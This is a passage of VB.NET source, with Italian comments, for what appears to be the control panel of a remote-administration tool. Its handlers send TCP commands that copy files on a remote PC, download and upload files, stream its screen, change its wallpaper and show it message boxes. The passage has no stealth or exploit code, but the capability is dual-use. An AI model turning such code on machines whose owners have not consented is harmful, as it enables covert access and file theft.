                        frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("{^'Copas<>|\" & txtClip.Text & "|à°à" & txtPath.Text & Split(txtClip.Text, "\")(UBound(Split(txtClip.Text, "\")))), 0, UTF8.GetBytes("{^'Copas<>|\" &
                                                                                                                                                                                txtClip.Text & "|à°à" & txtPath.Text &
                                                                                                                                                                                Split(txtClip.Text, "\")(UBound(Split(txtClip.Text, "\")))).Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try

                End If

                If FoD = "Folder" Then
                    Try
                        frmMain.netstream(Me.lblClid.Text - 1).Write(
                                                UTF8.GetBytes("||=8çD" & txtClip.Text & "|'òò+|" & txtPath.Text & Split(txtClip.Text, "\")(UBound(Split(txtClip.Text, "\")))), 0, UTF8.GetBytes("||=8çD" &
                                                                                                                                                                                                    txtClip.Text & "|'òò+|" & txtPath.Text &
                                                                                                                                                                                    Split(txtClip.Text, "\")(UBound(Split(txtClip.Text, "\")))).Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try

                End If


            Else
                MsgBox("First of all copy in clipboard, a file or a folder", MsgBoxStyle.Information)
            End If


        Else

            MsgBox("There is not any selected path!", MsgBoxStyle.Information)
        End If



    End Sub

    Private Sub MakeANewFolderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MakeANewFolderToolStripMenuItem.Click
        Try


            If Not txtPath.Text = "" Then

                Dim risp4 As String
                risp4 = InputBox("Write a name..", "Make a folder")
                If Not risp4 = "" Then

                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("||^#°Mak" & txtPath.Text & risp4), 0, UTF8.GetBytes("||^#°Mak" & txtPath.Text & risp4).Length) 'invio il comando il Client

                    risp4 = ""
                Else
                    risp4 = ""
                    MsgBox("The name is not valid", MsgBoxStyle.Exclamation)
                End If

            Else

                MsgBox("There is not any selected path!", MsgBoxStyle.Information)
            End If


        Catch ex As Exception
            ISPC = False
        End Try
    End Sub



    Private Sub picScreen_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles picScreen.MouseClick
        Try
            cxmstrPoSch.Show(picScreen, New Point(e.X, e.Y))
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub CloseConnectionToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseConnectionToolStripMenuItem.Click
        FileClose(Me.lblClid.Text + 2)
        If Not FPAN2(Me.lblClid.Text - 1) Is Nothing Then
            FPAN2(Me.lblClid.Text - 1).LoopMouse = False
            FPAN2(Me.lblClid.Text - 1).LoopScreen = False
            FPAN2(Me.lblClid.Text - 1).Close()
        End If
        If Not clientschermo Is Nothing Then
            clientschermo.Close()
        End If

        If Not listenerschermo Is Nothing Then
            listenerschermo.Stop()
        End If
        tmrDatiSchermo.Enabled = False
        tmrPannSchermo.Enabled = False
        picScreen.BackColor = Color.Red
        ISPCschermo = False
        Try
            frmMain.netstream(
                               Me.lblClid.Text - 1).Write(
                               UTF8.GetBytes("clos-."), 0, UTF8.GetBytes("clos-.").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub StartListeningToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartListeningToolStripMenuItem.Click
        If Not picScreen.BackColor = Color.Green Then
            Try
                listenerschermo = New TcpListener(IPAddress.Any, nudS.Value)
                listenerschermo.Start()
                tmrPannSchermo.Start()
                picScreen.BackColor = Color.Yellow


                Try
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("-AttSS}"), 0, UTF8.GetBytes("-AttSS}").Length) 'invio il comando il Client
                Catch ex As Exception
                    ISPC = False
                End Try

            Catch ex As Exception
                MsgBox("Maybe a listener is currently started, close or restart it to run an other socket or a control panel", MsgBoxStyle.Information)
            End Try
        Else

            MsgBox("The screen socket is listening or is already connected", MsgBoxStyle.Information)
        End If
    End Sub


    Private Sub picDow_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles picDow.MouseClick
        Try
            cxmstrPoDow.Show(picDow, New Point(e.X, e.Y))
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub tmrPannDow_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrPannDow.Tick
        Try
            If listenerdow.Pending Then
                clientdow = listenerdow.AcceptTcpClient()
                netstreamdow = clientdow.GetStream()
                ISCONNDOW = True
                tmrPannDow.Stop()
                tmrDatiDow.Start()
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub StartListeningToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartListeningToolStripMenuItem1.Click
        If Not picDow.BackColor = Color.Green Then
            Try
                listenerdow = New TcpListener(IPAddress.Any, nudD.Value)
                listenerdow.Start()
                tmrPannDow.Start()
                picDow.BackColor = Color.Yellow


                Try
                    frmMain.netstream(
                       Me.lblClid.Text - 1).Write(
                      UTF8.GetBytes("??^{dowh!}"), 0, UTF8.GetBytes("??^{dowh!}").Length) 'invio il comando il Client
                Catch ex As Exception
                    ISPC = False
                End Try

            Catch ex As Exception
                MsgBox("Maybe a listener is currently started, close or restart it to run an other socket or a control panel", MsgBoxStyle.Information)
            End Try
        Else

            MsgBox("The download socket is listening or is already connected", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub CloseConnectionToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseConnectionToolStripMenuItem1.Click
        FileClose(Me.lblClid.Text + 4)
        prgDown.Value = 0
        prgDown.Maximum = 100
        lblBytesD.Text = "0 kb"
        cmdStartDow.Enabled = True
        lstwDowL.Items.Clear()
        If Not clientdow Is Nothing Then
            clientdow.Close()
        End If

        If Not listenerdow Is Nothing Then
            listenerdow.Stop()
        End If
        tmrDatiDow.Enabled = False
        tmrPannDow.Enabled = False
        picDow.BackColor = Color.Red
        ISCONNDOW = False
        Try
            frmMain.netstream(
                            Me.lblClid.Text - 1).Write(
                            UTF8.GetBytes("\e=mc^2\"), 0, UTF8.GetBytes("\e=mc^2\").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub AddToDownloadListToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AddToDownloadListToolStripMenuItem.Click
        Try
            If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then
                If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "File" Then
                    lstwDowL.Items.Add(lstwFileFolderR.SelectedItems.Item(0).Text, 6)
                    lstwDowL.Items.Item(lstwDowL.Items.Count - 1).SubItems.Add(txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text)
                    lstwDowL.Items.Item(lstwDowL.Items.Count - 1).SubItems.Add(lstwFileFolderR.SelectedItems.Item(0).SubItems(2).Text)
                Else
                    MsgBox("Please select a file", MsgBoxStyle.Information)
                End If
            Else
                MsgBox("Select a file to add in the list!", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdStartDow_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdStartDow.Click
        If Me.picDow.BackColor = Color.Green Then
            If Not lstwDowL.Items.Count <= 0 Then
                Try
                    FileClose(lblClid.Text + 4)
                    cmdStartDow.Enabled = False
                    netstreamdow.Write(
                               UTF8.GetBytes("|^D°wS#t^|" & lstwDowL.Items.Item(lstwDowL.Items.Count - 1).SubItems(1).Text), 0, UTF8.GetBytes("|^D°wS#t^|" &
                                                                                                                                              lstwDowL.Items.Item(lstwDowL.Items.Count - 1).SubItems(1).Text).Length) 'invio il comando il Client

                Catch ex As Exception
                    ISCONNDOW = False
                End Try
            Else
                MsgBox("The file list is empty", MsgBoxStyle.Information)
            End If
        Else
            MsgBox("The download socket is listening or is not connected!", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub tmrDatiDow_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiDow.Tick
        If ISCONNDOW = True Then
            If clientdow.Available > 0 Then
                Dim buffer5(clientdow.Available - 1) As Byte
                netstreamdow.Read(buffer5, 0, buffer5.Length)
                Dim fni As Integer
                fni = Me.lblClid.Text + 4
                If InStr(UTF8.GetString(buffer5), "||vsizfil{}") Then
                    FileClose(fni)
                    FilNas = lstwDowL.Items.Item(lstwDowL.Items.Count - 1).SubItems.Item(1).Text
                    FilNas2 = lstwDowL.Items.Item(lstwDowL.Items.Count - 1).Text
                    prgDown.Maximum = Replace(UTF8.GetString(buffer5), "||vsizfil{}", "")
                    If Not Directory.Exists(Application.StartupPath & "\Computers") = True Then
                        MkDir(Application.StartupPath & "\Computers")
                        If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                            MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                            End If

                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                            End If
                        End If
                    Else
                        If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                            MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                            End If

                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                            End If
                        Else

                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                            End If

                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                            End If
                        End If
                    End If
                    If Dir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads\" & FilNas2) <> "" Then
                        Kill(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads\" & FilNas2)
                    End If
                    FileOpen(fni, Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads\" & FilNas2, OpenMode.Binary)
                    Try
                        netstreamdow.Write(
                               UTF8.GetBytes("^O°K0^"), 0, UTF8.GetBytes("^O°K0^").Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISCONNDOW = False
                    End Try
                Else

                    If Not prgDown.Value + buffer5.Length > prgDown.Maximum Then
                        prgDown.Value = prgDown.Value + buffer5.Length
                    End If

                    lblBytesD.Text = (Math.Round(prgDown.Value / 1024)).ToString() & " kb"
                    FilePut(fni, buffer5)
                    If prgDown.Value = prgDown.Maximum Then
                        lblBytesD.Text = "0 kb"
                        If Not lstwDowL.Items.Count <= 0 Then
                            lstwDowL.Items.Item(lstwDowL.Items.Count - 1).Remove()
                        End If
                        FileClose(fni)
                        cmdStartDow.Enabled = True
                        prgDown.Value = 0
                        If chkAvvFFin.Checked = True Then
                            Try
                                Process.Start(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads\" & FilNas2)
                            Catch ex As Exception
                                MsgBox("Unable to find an application to run this file" & vbCrLf & Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads\" & FilNas2, MsgBoxStyle.Information, "Error")
                            End Try
                        End If
                        FilNas = ""
                        If Not lstwDowL.Items.Count <= 0 Then
                            Try
                                FileClose(lblClid.Text + 2)
                                cmdStartDow.Enabled = False
                                netstreamdow.Write(
                                           UTF8.GetBytes("|^D°wS#t^|" & lstwDowL.Items.Item(lstwDowL.Items.Count - 1).SubItems(1).Text), 0, UTF8.GetBytes("|^D°wS#t^|" &
                                                                                                                                                          lstwDowL.Items.Item(lstwDowL.Items.Count - 1).SubItems(1).Text).Length) 'invio il comando il Client

                            Catch ex As Exception
                                ISCONNDOW = False
                            End Try
                        End If
                    End If

                End If

            End If
        Else
            FileClose(Me.lblClid.Text + 4)
            clientdow.Close()
            lstwDowL.Items.Clear()
            cmdStartDow.Enabled = True
            tmrDatiDow.Enabled = False
            tmrPannDow.Enabled = False
            picDow.BackColor = Color.Red
            MsgBox("The download server was not connected!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub cmdSDing_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSDing.Click
        Try
            If lstwDowL.Items.Count <= 0 Then
            Else
                If cmdStartDow.Enabled = True Then
                    lstwDowL.Items.Clear()
                Else
                    lstwDowL.Items.Clear()
                End If
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub RemoveFromTheListToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveFromTheListToolStripMenuItem.Click
        Try
            If Not lstwDowL.SelectedItems.Count <= 0 Then

                If cmdStartDow.Enabled = False Then
                    If Not lstwDowL.SelectedItems.Item(0).Index = lstwDowL.Items.Count - 1 Then
                        lstwDowL.SelectedItems.Item(0).Remove()
                    Else
                        MsgBox("This file is currently in downloading", MsgBoxStyle.Information)
                    End If
                Else
                    lstwDowL.SelectedItems.Item(0).Remove()
                End If

            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub lstwDowL_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles lstwDowL.MouseUp
        Try
            If e.Button = Windows.Forms.MouseButtons.Right Then

                cxmstrDow.Show(Me.lstwDowL, New Point(e.X, e.Y))

            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub



    Private Sub cmdHWR_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdHWR.Click
        Try

            If MsgBox("Do you want to delete the remote wallpaper to facilitate the image transfer?", MsgBoxStyle.YesNo) = vbYes Then
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("{DeskC}"), 0, UTF8.GetBytes("{DeskC}").Length) 'invio il comando il Client
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub SetAsWallpaperToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SetAsWallpaperToolStripMenuItem.Click
        Try
            If Not lstwFileFolderR.SelectedIndices.Count <= 0 Then

                If Not txtPath.Text = "" Then

                    If lstwFileFolderR.SelectedItems.Item(0).SubItems(1).Text = "File" Then


                        If MsgBox("Do you want to set the image as wallpaper?", MsgBoxStyle.YesNo) = vbYes Then
                            Try
                                frmMain.netstream(
                                    Me.lblClid.Text - 1).Write(
                                    UTF8.GetBytes("\S\e\t\" & txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text), 0, UTF8.GetBytes("\S\e\t\" &
                                    txtPath.Text & lstwFileFolderR.SelectedItems.Item(0).Text).Length) 'invio il comando il Client

                            Catch ex As Exception
                                ISPC = False
                            End Try
                        End If


                    Else
                        MsgBox("Please, select a file!", MsgBoxStyle.Information)
                    End If

                Else

                    MsgBox("There is not any selected path!", MsgBoxStyle.Information)
                End If

            Else
                MsgBox("Select a file to set!", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdClearlogMex_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdClearlogMex.Click
        txtLogmex.Text = ""
    End Sub

    Private Sub cmdNothg_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdNothg.Click
        lblMStyle.Text = "Nothing"
        grpchkDom.Enabled = False
    End Sub

    Private Sub cmdInfo_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdInfo.Click
        lblMStyle.Text = "Information"
        grpchkDom.Enabled = False
    End Sub

    Private Sub cmdEr_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdEr.Click
        lblMStyle.Text = "Error"
        grpchkDom.Enabled = False
    End Sub

    Private Sub cmdWa_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdWa.Click
        lblMStyle.Text = "Warning"
        grpchkDom.Enabled = False
    End Sub

    Private Sub cmdDom_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdDom.Click
        lblMStyle.Text = "Question"
        grpchkDom.Enabled = True
    End Sub

    Private Sub cmdCTEMR_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdCTEMR.Click
        txtTitle.Text = ""
        txtMess.Text = ""
        txtLogmex.Text = txtLogmex.Text & "The message has been deleted - " & TimeOfDay & vbCrLf
    End Sub

    Private Sub cmdSendmex_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSendmex.Click
        If lblMStyle.Text = "Nothing" Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(txtTitle.Text & "|<9({)>|" & txtMess.Text), 0, UTF8.GetBytes(txtTitle.Text & "|<9({)>|" & txtMess.Text).Length) 'invio il comando il Client
                txtLogmex.Text = txtLogmex.Text & "The message has been sent - Nothing " & TimeOfDay & vbCrLf
            Catch ex As Exception
                ISPC = False
            End Try
        End If

        If lblMStyle.Text = "Error" Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(txtTitle.Text & "|_1({+]>" & txtMess.Text), 0, UTF8.GetBytes(txtTitle.Text & "|_1({+]>" & txtMess.Text).Length) 'invio il comando il Client
                txtLogmex.Text = txtLogmex.Text & "The message has been sent - Error " & TimeOfDay & vbCrLf
            Catch ex As Exception
                ISPC = False
            End Try
        End If

        If lblMStyle.Text = "Information" Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(txtTitle.Text & "'#{2}##°°°" & txtMess.Text), 0, UTF8.GetBytes(txtTitle.Text & "'#{2}##°°°" & txtMess.Text).Length) 'invio il comando il Client
                txtLogmex.Text = txtLogmex.Text & "The message has been sent - Information " & TimeOfDay & vbCrLf
            Catch ex As Exception
                ISPC = False
            End Try
        End If

        If lblMStyle.Text = "Warning" Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(txtTitle.Text & "__|{5|__" & txtMess.Text), 0, UTF8.GetBytes(txtTitle.Text & "__|{5|__" & txtMess.Text).Length) 'invio il comando il Client
                txtLogmex.Text = txtLogmex.Text & "The message has been sent - Warning " & TimeOfDay & vbCrLf
            Catch ex As Exception
                ISPC = False
            End Try
        End If

        If lblMStyle.Text = "Question" Then
            If rbutYN.Checked = True Then
                Try
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes(txtTitle.Text & "rbu{t|Y|N|" & txtMess.Text), 0, UTF8.GetBytes(txtTitle.Text & "rbu{t|Y|N|" & txtMess.Text).Length) 'invio il comando il Client
                    txtLogmex.Text = txtLogmex.Text & "The message has been sent - Question " & TimeOfDay & vbCrLf
                Catch ex As Exception
                    ISPC = False
                End Try
            End If

            If rbutYNC.Checked = True Then
                Try
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes(txtTitle.Text & "rbutY{}N\C|" & txtMess.Text), 0, UTF8.GetBytes(txtTitle.Text & "rbutY{}N\C|" & txtMess.Text).Length) 'invio il comando il Client
                    txtLogmex.Text = txtLogmex.Text & "The message has been sent - Question " & TimeOfDay & vbCrLf
                Catch ex As Exception
                    ISPC = False
                End Try
            End If

            If rbutYNI.Checked = True Then
                Try
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes(txtTitle.Text & "rY|N#°°|I" & txtMess.Text), 0, UTF8.GetBytes(txtTitle.Text & "rY|N#°°|I" & txtMess.Text).Length) 'invio il comando il Client
                    txtLogmex.Text = txtLogmex.Text & "The message has been sent - Question " & TimeOfDay & vbCrLf
                Catch ex As Exception
                    ISPC = False
                End Try
            End If

        End If


    End Sub

    Private Sub cmdTestMex_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdTestMex.Click
        If lblMStyle.Text = "Nothing" Then
            MsgBox(txtMess.Text, , txtTitle.Text)

            txtLogmex.Text = txtLogmex.Text & "The message has been tested - Nothing " & TimeOfDay & vbCrLf
        End If

        If lblMStyle.Text = "Error" Then
            MsgBox(txtMess.Text, MsgBoxStyle.Critical, txtTitle.Text)

            txtLogmex.Text = txtLogmex.Text & "The message has been tested - Error " & TimeOfDay & vbCrLf

        End If

        If lblMStyle.Text = "Information" Then
            MsgBox(txtMess.Text, MsgBoxStyle.Information, txtTitle.Text)

            txtLogmex.Text = txtLogmex.Text & "The message has been tested - Information " & TimeOfDay & vbCrLf

        End If

        If lblMStyle.Text = "Warning" Then
            MsgBox(txtMess.Text, MsgBoxStyle.Exclamation, txtTitle.Text)

            txtLogmex.Text = txtLogmex.Text & "The message has been tested - Warning " & TimeOfDay & vbCrLf

        End If

        If lblMStyle.Text = "Question" Then
            If rbutYN.Checked = True Then

                MsgBox(txtMess.Text, MsgBoxStyle.YesNo, txtTitle.Text)
                txtLogmex.Text = txtLogmex.Text & "The message has been tested - Question1 " & TimeOfDay & vbCrLf

            End If

            If rbutYNC.Checked = True Then
                MsgBox(txtMess.Text, MsgBoxStyle.YesNoCancel, txtTitle.Text)
                txtLogmex.Text = txtLogmex.Text & "The message has been tested - Question2 " & TimeOfDay & vbCrLf
            End If

            If rbutYNI.Checked = True Then
                MsgBox(txtMess.Text, MsgBoxStyle.RetryCancel, txtTitle.Text)
                txtLogmex.Text = txtLogmex.Text & "The message has been tested - Question3 " & TimeOfDay & vbCrLf
            End If

        End If

    End Sub

    Private Sub tmrPannUp_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrPannUp.Tick
        If listenerup.Pending Then
            clientup = listenerup.AcceptTcpClient()
            netstreamup = clientup.GetStream()
            ISCONNup = True
            tmrPannUp.Stop()
            tmrDatiUp.Start()
        End If
    End Sub



    Private Sub picUp_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles picUp.MouseClick
        Try
            cxmstrPoUp.Show(picUp, New Point(e.X, e.Y))
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub StartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        Try
            If Not picUp.BackColor = Color.Green Then
                Try
                    listenerup = New TcpListener(IPAddress.Any, nudU.Value)
                    listenerup.Start()
                    tmrPannUp.Start()
                    picUp.BackColor = Color.Yellow


                    Try
                        frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("!!<UUp}|"), 0, UTF8.GetBytes("!!<UUp}|").Length) 'invio il comando il Client
                    Catch ex As Exception
                        ISPC = False
                    End Try

                Catch ex As Exception
                    MsgBox("Maybe a listener is currently started, close or restart it to run an other socket or a control panel", MsgBoxStyle.Information)
                End Try
            Else

                MsgBox("The upload socket is listening or is already connected", MsgBoxStyle.Information)
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub CloseConnectionToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseConnectionToolStripMenuItem2.Click
        FileClose(Me.lblClid.Text + 6)
        'prgUp.Value = 0
        'prgUp.Maximum = 100
        'lblBytesUp.Text = "0 kb"
        lblStatUp.Text = "Stopped"
        cmsStartUp.Enabled = True
        lstwUpL.Items.Clear()
        If Not clientup Is Nothing Then
            clientup.Close()
        End If

        If Not listenerup Is Nothing Then
            listenerup.Stop()
        End If
        tmrDatiUp.Enabled = False
        tmrPannUp.Enabled = False
        picUp.BackColor = Color.Red
        ISCONNup = False
        Try
            frmMain.netstream(
                          Me.lblClid.Text - 1).Write(
                         UTF8.GetBytes("||upàà°°{"), 0, UTF8.GetBytes("||upàà°°{").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub




    Private Sub cmdInfoPorte_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdInfoPorte.Click
        Try
            Dim buttonToolTip As New ToolTip()
            buttonToolTip.ToolTipIcon = ToolTipIcon.Info
            buttonToolTip.ToolTipTitle = "Info Ports"
            buttonToolTip.UseFading = True
            buttonToolTip.UseAnimation = True
            buttonToolTip.IsBalloon = False
            buttonToolTip.Show("Click the quare to open the corresponding port", picScreen, 3000)
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub tmrDatiUp_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiUp.Tick
        If ISCONNup = True Then
            If clientup.Available > 0 Then
                Dim buffer6(clientup.Available - 1) As Byte
                netstreamup.Read(buffer6, 0, buffer6.Length)
                Dim datiup As String = UTF8.GetString(buffer6)
                If Not lstwUpL.Items.Count <= 0 Then
                    Dim Fn33 As String = lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Item(1).Text
                    Dim FiDat(FileLen(Fn33) - 1) As Byte
                    If InStr(datiup, "{Up/}OK") Then
                        Try
                            If Dir(Fn33) <> "" Then
                                FileOpen(Me.lblClid.Text + 6, Fn33, OpenMode.Binary)
                                FileGet(Me.lblClid.Text + 6, FiDat)
                                FileClose(Me.lblClid.Text + 6)
                            Else
                                ReDim FiDat(0)
                                lblStatUp.Text = "Stopped"
                                MsgBox("The file " & Fn33 & " does not exist!", MsgBoxStyle.Exclamation)
                            End If
                        Catch ex As Exception
                            lblStatUp.Text = "Stopped"
                            ReDim FiDat(0)
                            MsgBox("Unable to read the file " & Fn33, MsgBoxStyle.Information)
                        End Try
                        'prgUp.Maximum = FiDat.Length
                        Try
                            If Not UBound(FiDat) = 0 Then
                                netstreamup.Write(FiDat, 0, FiDat.Length) 'invio il comando il Client
                            End If
                        Catch ex As Exception
                            ISCONNup = False
                        End Try
                    End If

                    If InStr(datiup, "ow|^e$") Then
                        lblStatUp.Text = "Stopped"
                        If Not lstwUpL.Items.Count <= 0 Then
                            lstwUpL.Items.Item(lstwUpL.Items.Count - 1).Remove()
                        End If
                        lblStatUp.Text = "Stopped"
                        If Me.picUp.BackColor = Color.Green Then
                            If Not lstwUpL.Items.Count <= 0 Then

                                Try
                                    lblStatUp.Text = "Stopped"
                                    FileClose(lblClid.Text + 6)
                                    FileToUp = lstwUpL.Items.Item(lstwUpL.Items.Count - 1).Text
                                    cmsStartUp.Enabled = False
                                    netstreamup.Write(
                                               UTF8.GetBytes(DirToUp & "\" & lstwUpL.Items.Item(lstwUpL.Items.Count - 1).Text & "|^Ca/çz£u^|" & FileLen(lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Item(1).Text)), 0, UTF8.GetBytes(
                                                   DirToUp & "\" & lstwUpL.Items.Item(lstwUpL.Items.Count - 1).Text & "|^Ca/çz£u^|" & FileLen(lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Item(1).Text)).Length) 'invio il comando il Client
                                    lblStatUp.Text = "In uploading"
                                Catch ex As Exception
                                    ISCONNup = False
                                End Try

                            Else
                                lblStatUp.Text = "Stopped"
                                cmsStartUp.Enabled = True
                                MsgBox("The file list is empty :)", MsgBoxStyle.Information)
                            End If
                        Else
                            lblStatUp.Text = "Stopped"
                            cmsStartUp.Enabled = True
                            MsgBox("The upload socket is listening or is not connected!", MsgBoxStyle.Information)
                        End If

                    End If
                End If
            End If
        Else
            FileClose(Me.lblClid.Text + 6)
            lblStatUp.Text = "Stopped"
            cmsStartUp.Enabled = True
            lstwUpL.Items.Clear()
            clientup.Close()
            tmrDatiUp.Enabled = False
            tmrPannUp.Enabled = False
            picUp.BackColor = Color.Red
            MsgBox("The upload server was not connected!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub cmdSPing_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSPing.Click
        Try
            If lstwUpL.Items.Count <= 0 Then
            Else
                If cmsStartUp.Enabled = True Then
                    lstwUpL.Items.Clear()
                    lblStatUp.Text = "Stopped"
                Else
                    lstwUpL.Items.Clear()
                End If
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub AddInUploadInProgressListToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AddInUploadInProgressListToolStripMenuItem.Click
        Try
            If Not txtPath.Text = "" Then
                Dim Dlg2 As New OpenFileDialog
                Dlg2.Filter = "All file|*.*"
